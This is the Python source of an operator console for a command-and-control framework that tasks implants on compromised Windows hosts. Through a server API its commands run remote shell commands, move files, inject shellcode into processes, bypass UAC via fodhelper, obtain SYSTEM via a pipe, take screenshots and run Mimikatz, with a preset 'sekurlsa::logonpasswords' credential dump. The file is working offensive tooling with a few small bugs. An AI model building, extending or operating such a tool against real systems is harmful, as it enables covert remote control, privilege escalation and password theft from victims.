import base64
import json
import sys
import requests
from pathlib import Path
from pprint import pprint
import toml

mysettings_server = ''

try:
    data = toml.load("config.toml")
    mysettings_server = data['settings']['server']
except:
    print("")

menu = 1
prompt = "> "
currentAgent = ""

# Define an enumeration subclass Enum
from enum import Enum

class errorcode(Enum):
    success = 0
    warning = 1
    invalid = 2

class taskstatus(Enum):
    Queued = 1
    Pending = 2
    Executing = 3
    Complete = 4
    Failed = 5
    NotSupported = 6

class tasktype(Enum):
    Terminate = 1
    Command = 2
    Pwd = 3
    ChangeDir = 4
    Whoami = 5
    PsList = 6
    Download = 7
    Upload = 8
    ListPrivs = 9
    SetPriv = 10
    RemoteInject = 11
    BypassUAC = 12
    Getsystem = 13
    Screenshot = 14
    Jitter = 15
    Mimikatz = 16

base_commands = {
    "help" : "print this info",
    "agents" : "agents information",
    "quit" : "exit from the console"
}

agents_commands = {
    "list" : "list all agents",
    "dropdb" : "delete all data from the db",
    "use" : "connect to a specific agent",
    "help" : "print this info",
    "back" : "go back to the main menu",
    "quit" : "same as back"
}

agent_interactive_commands = {
    "task" : "Display specific task details. Usage: task",
    "history" : "Display details of all the tasks assigned to this agent till now. Usage: history",
    "sysinfo" : "Display basic agent details. Usage: sysinfo",
    "shell" : "Execute os command. Usage: shell [cmd with args]",
    "ps": "Print list of running processes. Usage: ps",
    "pwd" : "Print current working directory. Usage: pwd",
    "cd" : "Change directory. Usage: cd <valid_directory>",
    "upload": "Upload a file to the Server. Usage: upload <local_file_path> <destination_file_path>",
    "download": "Download a file. Usage: download <file_path_on_agent_machine>",
    "listprivs": "List privileges. Usage: listprivs",
    "setpriv": "Enable or disable a priv. Usage: setpriv <privilege_name> [enabled/disabled]",
    "scinject": "Remote shellcode injection. Usage: scinject [path/shellcode] [pid]",
    "bypassuac": "Bypass user access control. Usage: bypassuac [method1=fodhelper] [cmd w/ args]",
    "getsystem": "Get system access via pipe. Usage: getsystem [method1=pipe] [cmd w/ args]",
    "mimikatz": "mimikatz for example [mimikatz privilege::debug] No need to add exit",
    "logonpasswords": "get all passwords",
    "screenshot": "Take screenshot of the current screen of agent machine. Usage: screenshot",
    "sleep": "Sleeps for some time. Usage: sleep <time_in_seconds> <jitter_in_percentage>",
    "getuid": "Get user information. Usage: getuid",
    "help" : "Print this information or information regarding specific command. Usage: help [agent_interactive_command]",
    "back" : "Go back to the agents menu. Usage: back",
    "terminate": "Kill agent. Usage: terminate",
    "resource": "Run a cmds from a file. RC file local to the CLI. one cmd per line. Usage: resource [cmds.rc]",
    "quit" : "Same as back. Usage: quit"
}

def print_task_type(task_type):
    match task_type:
        case tasktype.Terminate.value:
            print("Terminate")
        case tasktype.Command.value:
            print("Command")
        case tasktype.Pwd.value:
            print("Pwd")
        case tasktype.ChangeDir.value:
            print("ChangeDir")
        case tasktype.Whoami.value:
            print("Whoami")
        case tasktype.PsList.value:
            print("PsList")
        case tasktype.Upload.value:
            print("Download")
        case tasktype.Download.value:
            print("Upload")
        case tasktype.ListPrivs.value:
            print("ListPrivs")
        case tasktype.SetPriv.value:
            print("SetPrivs")
        case tasktype.RemoteInject.value:
            print("RemoteInject")
        case tasktype.BypassUAC.value:
            print("BypassUAC")
        case tasktype.Getsystem.value:
            print("Getsystem")
        case tasktype.Screenshot.value:
            print("Screenshot")
        case tasktype.Jitter.value:
            print("Sleep")
        case tasktype.Mimikatz.value:
            print("Mimikatz")
        case tasktype.logonpasswords .value:
            print("logonpasswords ")
        case _:
            print("Unknown")
        
def api_task_details(task_id):
    global mysettings_server
    url = "http://{}/admin/api/task/{}".format(mysettings_server,task_id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_task_history(id):
    global mysettings_server
    url = "http://{}/admin/api/agent_task/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_get_agent(id):
    global mysettings_server
    url = "http://{}/admin/api/agent/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None
            
def api_agents():
    global mysettings_server
    url = "http://{}/admin/api/agents".format(mysettings_server)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_dropdb():
    global mysettings_server
    url = "http://{}/admin/api/dropdb".format(mysettings_server)
    r = requests.get(url,timeout=300)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_send_task(task,timeout=60):
    global mysettings_server
    url = "http://{}/admin/api/task".format(mysettings_server)
    r = requests.post(url,json=task,timeout=timeout)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def print_agents(agents):
    print("--------------------------------------------------")
    if agents == None:
        print("Cant connect to server")
    elif len(agents) == 0:
        print("\t\tNo agents")
    else:
        for agent in agents:
            print_agent_details(agent)
            if len(agents) > 1:    
                print("-------")
    print("--------------------------------------------------")

def print_task_details(task):
    if task == None:
        print("Cant connect to server")
    else:
        print("")
        print("ID\t\t:",task['id'])
        print("Type\t\t: ",end="")
        print_task_type(task['type'])
        print("Created\t\t:",task['created'])
        print("Updated\t\t:",task['updated'])
        print("Input\t\t:",task['input'][:512])
        if task['status'] == 1:
            print("Status\t\t: Queued")
        elif task['status'] == 2:
            print("Status\t\t: Pending")
        elif task['status'] == 3:
            print("Status\t\t: Executing")
        elif task['status'] == 4:
            print("Status\t\t: Complete")
            output = base64.b64decode(task['result']).decode('utf-8')
            if len(output) > 1024:
                print("Result\t\t:\n",output[:32768])
            else:
                print("Result\t\t:\n",output)
        elif task['status'] == 5:
            print("Status\t\t: Failed")
            output = base64.b64decode(task['result']).decode('utf-8')
            if len(output) > 1024:
                print("Result\t\t:\n",output[:16384])
            else:
                print("Result\t\t:\n",output)
        elif task['status'] == 6:
            print("Status\t\t: Not Supported")

def print_task_history(task_history):
    print("--------------------------------------------------")
    if task_history == None:
        print("Cant connect to server")
    elif len(task_history) == 0:
        print("\t\tNo tasks")
    else:
        for task in task_history:
            print("---")
            print("ID\t\t:",task['id'])
            print("Type\t\t: ",end="")
            print_task_type(task['type'])
            print("Input\t\t:",task['input'][:75])
            if task['status'] == 1:
                print("Status\t\t: Queued")
            elif task['status'] == 2:
                print("Status\t\t: Pending")
            elif task['status'] == 3:
                print("Status\t\t: Executing")
            elif task['status'] == 4:
                print("Status\t\t: Completed")
            elif task['status'] == 5:
                print("Status\t\t: Failed")
            elif task['status'] == 6:
                print("Status\t\t: Not Supported")
            print("Created\t\t:",task['created'])
            print("Updated\t\t:",task['updated'])
    print("--------------------------------------------------")

## agent is a json object
def print_agent_details(agent):
    if agent == None:
        print("Cant connect to server")
    else:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        print("Integrity\t:",agent['integrity'])
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])
        print("-------")


def agent_send_host_download_file_exec(type,path,input):
    json_data = {   'agent_id': current_agent, 
                    'path': path, 
                    'type': type,
                    'input_args':input
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file_exec".format(mysettings_server)
    r = requests.post(url,json=json_data,timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_host_download_file(path,dst_path):
    json_data = {   'agent_id': current_agent, 
                    'path': path, 
                    'dst_path':dst_path
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file".format(mysettings_server)
    r = requests.post(url,json=json_data,timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_cmd(type = 1, input = ''):
    json_data = {   'agent_id': current_agent, 
                    'input': input, 
                    'status': 1, 
                    'type': type
                }
    pprint(json_data)
    data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
    task = { 'data': data }
    result = api_send_task(task)
    pprint(result)

def agent_send_terminate_cmd():
    agent_send_cmd(tasktype.Terminate.value)

def agent_send_shell_cmd(shell_cmd):
    agent_send_cmd(tasktype.Command.value,shell_cmd)

def agent_send_pwd_cmd():
    agent_send_cmd(tasktype.Pwd.value)

def agent_send_cd_cmd(cd_dir):
    agent_send_cmd(tasktype.ChangeDir.value,cd_dir)

def agent_send_getuid_cmd():
    agent_send_cmd(tasktype.Whoami.value)

def agent_send_ps_cmd():
    agent_send_cmd(tasktype.PsList.value)

def agent_send_download_cmd(srv_path,dst_path):
    agent_send_host_download_file(srv_path,dst_path)
    
def agent_send_upload_cmd(uploadpath):
    agent_send_cmd(tasktype.Upload.value,uploadpath)

def agent_send_jitter_cmd(sleep_time):
    agent_send_cmd(tasktype.Jitter.value, sleep_time)

def agent_send_listprivs_cmd():
    #agent_send_cmd(tasktype.ListPrivs.value)
    agent_send_host_download_file_exec(
        tasktype.ListPrivs.value,
        "cli\\modules\\listprivs\\listprivs_x64.dll",
        ""
    )

def agent_send_setpriv_cmd(input):
    #agent_send_cmd(tasktype.SetPriv.value,input)
    agent_send_host_download_file_exec(
        tasktype.SetPriv.value,
        "cli\\modules\\setpriv\\setpriv_x64.dll",
        input
    )

def agent_send_bypassUAC_cmd(input):
    #agent_send_cmd(tasktype.SetPriv.value,input)
    agent_send_host_download_file_exec(
        tasktype.BypassUAC.value,
        "cli\\modules\\uacbypass\\bypassUACx64.dll",
        input
    )

def agent_send_getSystem_cmd(input):
    #agent_send_cmd(tasktype.SetPriv.value,input)
    agent_send_host_download_file_exec(
        tasktype.Getsystem.value,
        "cli\\modules\\getsystem\\getsystem_x64.dll",
        input
    )

def agent_send_mimikatz_cmd(input):
    #agent_send_cmd(tasktype.SetPriv.value,input)
    agent_send_host_download_file_exec(
        tasktype.Mimikatz.value,
        "cli\\modules\\mimikatz\\mimikatz_x64.dll",
        input
    )

def agent_send_screenshot_cmd():
    #agent_send_cmd(tasktype.SetPriv.value,input)
    agent_send_host_download_file_exec(
        tasktype.Screenshot.value,
        "cli\\modules\\screenshot\\screenshot_x64.dll",
        ""
    )

def agent_task_details(task_id):
    task = api_task_details(task_id)
    print_task_details(task)

def agent_history():
    task_history = api_task_history(current_agent)
    print_task_history(task_history)
        
def agent_sysinfo():
    agent = api_get_agent(current_agent)
    if "id" in agent:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        if agent['integrity'] == 3:
            print("Integrity\t:",agent['integrity']," - Medium")
        elif agent['integrity'] == 4:
            print("Integrity\t:",agent['integrity']," - High")
        elif agent['integrity'] == 5:
            print("Integrity\t:",agent['integrity']," - SYSTEM")
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])

def use_agent(inputstr):
    global current_agent
    global menu
    global prompt
    agent_json = api_get_agent(inputstr)
    if agent_json == None:
        print("Cant connect to server")
    elif "id" in agent_json:
        menu = 3
        current_agent = inputstr
        prompt = inputstr + " > "
        print_agent_details(agent_json)
    else:
        print("invalid agent_id")

def list_agents():
    agents = api_agents()
    print_agents(agents)

def set_agent_menu():
    global menu
    global prompt
    menu = 2
    prompt = "agents > "

def set_main_menu():
    global menu
    global prompt
    menu = 1
    prompt = "> "

def print_help_command_info(help_command):
    print(agent_interactive_commands[help_command])

def print_main_menu_help():
    for i in base_commands :
        print(i,"\t:", base_commands[i])

def print_agents_help():
    for i in agents_commands:
        print(i,"\t:", agents_commands[i])

def print_agent_interactive_help():
    for i in agent_interactive_commands:
        if(len(str(i)) >= 7):
            print(i,"\t:", agent_interactive_commands[i])
        else:
            print(i,"\t\t:", agent_interactive_commands[i])

#
# main menu 1
# agents 2
# interactive agent 3
#
def parseInput(inputstr):
    if inputstr == "quit" or inputstr == "back" or inputstr == "exit":
        if menu == 1:
            sys.exit(0)
        elif menu == 2:
            set_main_menu()
        elif menu == 3: 
            set_agent_menu()
    elif inputstr.startswith("help "):
        help_command = inputstr.replace('help ', '')
        print_help_command_info(help_command)
        print("")
    elif inputstr == "help":
        if menu == 1:
            print_main_menu_help()
            print("")
        elif menu == 2:
            print_agents_help()
            print("")
        elif menu == 3:
            print_agent_interactive_help()
            print("")   
        else:
            print("")
    elif inputstr == "agents":
        set_agent_menu()
    elif menu == 2:
        if inputstr == "list":
            list_agents()
        if inputstr == "dropdb":
            api_dropdb()
        elif inputstr.startswith("use "):
            agent_id = inputstr.replace('use ', '')
            use_agent(agent_id)
    elif menu == 3:
        if inputstr == "sysinfo":
            agent_sysinfo()
        elif inputstr == "terminate":
            agent_send_terminate_cmd()
        elif inputstr.startswith("shell "):
            shell_cmd = inputstr.replace('shell ', '')
            agent_send_shell_cmd(shell_cmd)
        elif inputstr == "pwd":
            agent_send_pwd_cmd()
        elif inputstr == "getuid" or inputstr == "whoami":
            agent_send_getuid_cmd()
        elif inputstr == "ps":
            agent_send_ps_cmd()
        elif inputstr.startswith("cd "):
            cd_dir = inputstr.replace('cd ', '')
            agent_send_cd_cmd(cd_dir)
        elif inputstr.startswith("sleep"):
            sleep_time = inputstr.replace('sleep ', '').strip()
            agent_send_jitter_cmd(sleep_time)
        ##
        ## we flip the perspective here for upload and download
        ##
        elif inputstr.startswith("download "):
            upload_path = inputstr.replace('download ', '')
            agent_send_upload_cmd(upload_path)
        elif inputstr.startswith("upload "):
            uploadfile_input = inputstr.replace('upload ', '')
            srv_path = uploadfile_input.split(" ")[0]
            dst_path = uploadfile_input.split(" ")[-1]
            agent_send_download_cmd(srv_path,dst_path) 
        elif inputstr == "listprivs":
            agent_send_listprivs_cmd()
        elif inputstr.startswith("setpriv "):
            setpriv_cmd = inputstr.replace('setpriv ', '')
            priv = setpriv_cmd.split(" ")[0]
            state = setpriv_cmd.split(" ")[-1]
            if state == "enabled" or state == "disabled":
                priv = priv + " " + state
                agent_send_setpriv_cmd(priv)
            else:
                print("invalid state. state should be enabled or disabled")
        elif inputstr.startswith("mimikatz "):
            mimikatz_cmd = inputstr.replace('mimikatz ', '')
            #mimikatz_cmd = mimikatz_cmd + ';exit'
            agent_send_mimikatz_cmd(mimikatz_cmd)
        elif inputstr == "logonpasswords":
            mimikatz_cmd = "privilege::debug;sekurlsa::logonpasswords;exit"
            agent_send_mimikatz_cmd(mimikatz_cmd)
        elif inputstr == "screenshot":
            agent_send_screenshot_cmd()
        elif inputstr.startswith("bypassuac "):
            bypass_cmd = inputstr.replace('bypassuac ', '')
            bypass = bypass_cmd.split(" ")[0]
            print(bypass)
            arg = bypass_cmd.replace(bypass, '').strip()
            print(arg)
            if bypass == "method1 = fodhelper" or bypass == "method 1 = fodhelper" or bypass == "method1=fodhelper" or bypass == "method 1=fodhelper" or bypass == "method 1= fodhelper" or bypass == "method1 =fodhelper" :
                bypass = bypass + " " + arg
                agent_send_bypassUAC_cmd(arg)
            else:
                print("Invalid argument. Bypassuac [method 1=fodhlper] [cmd w/ args]")

        elif inputstr.startswith("getsystem "):
            getsystem_cmd = inputstr.replace('getsystem ', '')
            system = getsystem_cmd.split(" ")[0]
            print(system)
            arg_system = getsystem_cmd.replace(system, '').strip()
            print(arg_system)
            if system == "method1 = pipe" or system == "method 1 = pipe" or system == "method1=pipe" or system == "method 1=pipe" or system == "method 1= pipe" or system == "method1 =pipe":
                system = system + " " + arg_system
                agent_send_getSystem_cmd(arg_system)
            else:
                print("Invalid argument. getsystem [method 1=pipe] [cmd w/ args]")

        elif inputstr.startswith("scinject "):
            scinject_cmd = inputstr.replace('scinject ', '')
            file = scinject_cmd.split(" ")[0]
            processOrpid = scinject_cmd.split(" ")[1]
            agent_send_host_download_file_exec(tasktype.RemoteInject.value,file,processOrpid)
        elif inputstr.startswith("resource "):
            autoruncmds = []
            resource_cmd = inputstr.replace('resource ', '')
            file = resource_cmd.split(" ")[0]
            pathfile = Path(file)
            if pathfile.is_file():
                f=open(file,"r")
                for line in f:
                    cmd = line.strip()
                    if(len(cmd) > 0):
                        autoruncmds.append(cmd)
                f.close()
                for cmd in autoruncmds:
                    parseInput(cmd)
        elif inputstr == "history" or inputstr == "tasks":
            agent_history()
        elif inputstr.startswith("task "):
            task_id = inputstr.replace('task ', '')
            print(task_id)
            agent_task_details(task_id)

while True:
    try:
        inputstr = str(input(prompt))
        print("")
        parseInput(inputstr)
    except TypeError as err:
        print("error: {}".format(err))
    except KeyboardInterrupt as err:
        sys.exit()
    except EOFError as err:
        sys.exit()
